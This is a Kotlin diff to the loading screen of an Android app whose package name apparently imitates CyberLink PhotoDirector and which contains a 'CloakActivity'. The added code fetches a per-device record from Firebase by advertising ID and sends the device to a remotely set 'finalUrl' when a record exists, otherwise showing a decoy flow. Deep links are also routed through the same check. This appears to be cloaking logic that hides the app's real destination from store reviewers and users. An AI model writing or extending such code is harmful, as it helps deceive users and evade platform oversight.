@@ -10,9 +10,8 @@ import androidx.appcompat.app.AppCompatActivity
 import androidx.lifecycle.ViewModelProvider
 import androidx.lifecycle.lifecycleScope
 import com.cyberlink.photodirecto.App
-import com.cyberlink.photodirecto.R
 import com.cyberlink.photodirecto.databinding.LoadingActivityBinding
-import com.cyberlink.photodirecto.ui.activities.cloack.CloakActivity
+import com.cyberlink.photodirecto.ui.activities.cloak.CloakActivity
 import com.cyberlink.photodirecto.ui.intents.DeepLinkIntent
 import com.cyberlink.photodirecto.ui.states.DeepLinkState
 import com.cyberlink.photodirecto.util.CustomDatabase
@@ -25,7 +24,6 @@ class LoadingActivity : AppCompatActivity() {
     private var _binding: LoadingActivityBinding? = null
     private val binding get() = _binding!!
     private lateinit var viewModel: MyViewModel
-    private lateinit var url: String
     private val firebase = CustomDatabase()
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -36,20 +34,21 @@ class LoadingActivity : AppCompatActivity() {
         viewModel.handleIntent(this.applicationContext)
         observeViewModel()
 //        imitateIntent()
-
         lifecycleScope.launch(Dispatchers.IO) {
-            url = firebase.getUrl(
-                this@LoadingActivity.getString(R.string.firebase_userId),
-                this@LoadingActivity.getString(R.string.firebase_path)
-            ).toString()
-            Log.d("custom", "firebase url - $url")
 
-            if (url != null) {
-                lifecycleScope.launch(Dispatchers.Main) {
-                    checkSecurity(url)
+            val user = firebase.getData(App.adID)
+
+
+            Log.d("custom", "firebase url - $user")
+
+            lifecycleScope.launch(Dispatchers.Main) {
+                user.let {
+                    if (user == null) {
+                        imitateIntent()
+                    } else {
+                        checkSecurity(user.finalUrl!!)
+                    }
                 }
-            } else {
-                imitateIntent()
             }
         }
     }
@@ -82,7 +81,7 @@ class LoadingActivity : AppCompatActivity() {
 
                     is DeepLinkState.DeepLink -> {
                         Log.d("customTag", "new url is - ${it.deepLink}")
-                        webStart(it.deepLink!!)
+                        checkSecurity(it.deepLink!!)
                         Log.d("customTage", "state deep")
                     }
                     is DeepLinkState.Error -> {
